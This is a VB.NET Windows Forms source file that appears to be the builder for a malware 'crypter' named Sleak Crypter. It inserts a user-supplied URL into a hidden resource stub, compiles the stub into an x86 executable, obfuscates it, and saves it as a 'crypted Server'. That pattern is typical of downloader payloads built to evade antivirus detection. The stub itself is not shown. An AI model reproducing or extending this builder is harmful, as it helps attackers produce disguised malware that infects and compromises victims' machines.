Imports Microsoft.CSharp
Imports SleakDirectFile.Tools
Imports System
Imports System.CodeDom.Compiler
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Data
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Linq
Imports System.Text
Imports System.Threading.Tasks
Imports System.Windows.Forms

Namespace SleakDirectFile
	Partial Public Class Form1
		Inherits Form

		Public Sub New()
			InitializeComponent()

		End Sub



		Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load

		End Sub

		Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button2.Click
			Dim en As New encode()
			en.Show()
		End Sub

		Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button1.Click
			If terms.Checked Then
				Dim sStub As String = My.Resources.Stub.Replace("%URL%",textBox1.Text)

				Using fSaveDialog As New SaveFileDialog()

					fSaveDialog.Filter = "Executable (*.exe)|*.exe"
					fSaveDialog.Title = "Save crypted Server..."

					If fSaveDialog.ShowDialog() = System.Windows.Forms.DialogResult.OK Then

						Using csCodeProvider As New CSharpCodeProvider(New Dictionary(Of String, String) From {{"CompilerVersion", "v4.0"}})
							Dim cpParams As New CompilerParameters(Nothing, fSaveDialog.FileName, True)

							cpParams.CompilerOptions = "/t:winexe /unsafe /platform:x86 /debug-"
							cpParams.ReferencedAssemblies.Add("System.dll")
							cpParams.ReferencedAssemblies.Add("System.Management.dll")
							cpParams.ReferencedAssemblies.Add("System.Windows.Forms.dll")
							cpParams.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll")
							cpParams.ReferencedAssemblies.Add("System.Threading.Tasks.dll")


							csCodeProvider.CompileAssemblyFromSource(cpParams, sStub)

							If Obfuscate.Rename(fSaveDialog.FileName) Then
								File.Delete(fSaveDialog.FileName)
								MessageBox.Show("File Crypted Successfully!", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information)
							Else
								MessageBox.Show("Could Not Crypt File Successfully!", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Information)
							End If

						End Using



					End If
				End Using
			Else
				MessageBox.Show("Please Accept The Rules and Regulations", "Sleak Crypter", MessageBoxButtons.OK, MessageBoxIcon.Error)
			End If
		End Sub


		Private Sub button3_Click(ByVal sender As Object, ByVal e As EventArgs) Handles button3.Click
			Application.Exit()
		End Sub

		Private Sub label2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles label2.Click
			Process.Start("https://www.hastepaste.com/")
		End Sub

		Private mouseLocation As Point
		Private Sub mousedown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles panel1.MouseDown
			mouseLocation = New Point(-e.X, -e.Y)

		End Sub

		Private Sub mouse_Move(ByVal sender As Object, ByVal e As MouseEventArgs) Handles panel1.MouseMove
			If e.Button = MouseButtons.Left Then
				Dim mousePose As Point = Control.MousePosition
				mousePose.Offset(mouseLocation.X, mouseLocation.Y)
				Location = mousePose
			End If
		End Sub

		Private Sub panel1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles panel1.Paint

		End Sub
	End Class
End Namespace
